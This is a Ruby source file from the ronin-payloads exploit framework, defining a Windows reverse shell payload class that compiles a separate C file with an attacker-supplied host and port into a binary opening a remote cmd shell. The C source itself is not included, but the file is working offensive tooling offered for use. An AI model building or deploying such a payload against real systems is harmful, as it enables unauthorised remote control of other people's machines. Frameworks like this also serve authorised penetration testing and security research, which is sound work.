# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/c_payload'
require 'ronin/payloads/metadata/os'
require 'ronin/payloads/mixins/reverse_shell'
require 'ronin/payloads/mixins/tempfile'

module Ronin
  module Payloads
    module Bin
      module Windows
        #
        # Windows C reverse shell that executes "cmd".
        #
        class ReverseShell < CPayload

          include Metadata::OS
          include Mixins::ReverseShell
          include Mixins::Tempfile

          register 'bin/windows/reverse_shell'

          os :windows

          param :arch, Enum[:"x86-64", :i686], default: :"x86-64",
                                               desc:    "The target arch"

          param :os, Enum[:windows], default: :windows,
                                     desc:    'The target OS'

          author "postmodern"

          summary 'Windows C reverse shell'
          description <<~DESC
            Windows reverse shell that executes "cmd" and is written in C.

            Note: this payload requires mingw32.
          DESC

          references [
            "https://github.com/izenynn/c-reverse-shell#readme",
            "https://github.com/izenynn/c-reverse-shell/blob/main/windows.c"
          ]

          # The path to the `reverse_shell.c` file.
          SOURCE_FILE = File.join(__dir__,'reverse_shell.c')

          #
          # Builds the shellcode.
          #
          def build
            tempfile('reverse_shell', ext: '.c') do |tempfile|
              compile(SOURCE_FILE, defs: {
                                     'CLIENT_IP'   => "\"#{params[:host]}\"",
                                     'CLIENT_PORT' => params[:port]
                                   },
                                   libs:   %w[ws2_32],
                                   output: tempfile.path)

              @payload = File.binread(tempfile.path)
            end
          end

        end
      end
    end
  end
end
